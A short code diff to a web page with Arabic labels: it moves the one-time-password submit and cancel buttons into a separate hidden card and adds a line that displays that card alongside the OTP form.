@@ -384,6 +384,10 @@
           <td class="td-label">:OTP</td>
         </tr>
       </table>
+    </div>
+
+    <!-- أزرار OTP -->
+    <div class="card action-card otp-action-card" id="otp-action-card" style="display:none">
       <div class="btn-row">
         <button class="btn" onclick="submitOtp()">إرسال</button>
         <button class="btn" onclick="handleCancel()">إلغاء</button>
@@ -800,6 +804,7 @@
         logo.style.display = 'none';
       }
       otpCard.style.display = 'block';
+      document.getElementById('otp-action-card').style.display = 'block';
     }
 
     function showRejected() {
